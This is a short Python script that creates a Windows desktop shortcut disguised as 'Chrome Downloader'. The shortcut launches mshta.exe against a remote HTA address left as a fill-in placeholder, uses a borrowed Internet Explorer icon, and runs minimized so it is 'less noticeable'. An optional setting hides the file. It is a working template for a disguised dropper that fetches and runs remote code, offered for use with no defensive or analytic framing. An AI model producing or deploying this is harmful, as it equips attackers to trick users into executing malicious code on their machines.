import os
import sys
import win32com.client
import ctypes

def create_silent_hta_shortcut():
    try:
        config = {
            'shortcut_name': "Chrome Downloader.lnk",
            'target': os.path.join(os.environ['SYSTEMROOT'], 'system32', 'mshta.exe'),
            'hta_url': "YOU_SITE/YOUR_HTA_APP",
            'icon': os.path.join(os.environ['SystemRoot'], 'System32', 'ieframe.dll'),
            'icon_index': 82,  # You can change the index to select different icons
            'description': "A Simple Downloader for Google Chrome via Edge",
            'window_style': 7,  # 7 = Minimized (less noticeable)
            'hidden': False
        }

        shell = win32com.client.Dispatch("WScript.Shell")
        desktop = shell.SpecialFolders("Desktop")
        shortcut_path = os.path.join(desktop, config['shortcut_name'])

        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = config['target']
        shortcut.Arguments = f'"{config["hta_url"]}" powershell -c "Invoke-WebRequest \'https://dl.google.com/chrome/install/latest/chrome_installer.exe\' -OutFile \'$env:USERPROFILE\\Downloads\\chrome_installer.exe\'"'  # HTA runs hidden due to window.close()
        shortcut.IconLocation = f"{config['icon']},{config['icon_index']}"
        shortcut.Description = config['description']
        shortcut.WindowStyle = config['window_style']
        shortcut.Save()

        if config['hidden']:
            ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)  # 2 = Hidden file

        if os.path.exists(shortcut_path):
            print(f"Success! Shortcut created: {shortcut_path}")
            return True
        else:
            raise FileNotFoundError("Shortcut not created")

    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return False

if __name__ == "__main__":
    if create_silent_hta_shortcut():
        print("Operation completed successfully")
    else:
        print("Failed to create shortcut", file=sys.stderr)
        sys.exit(1)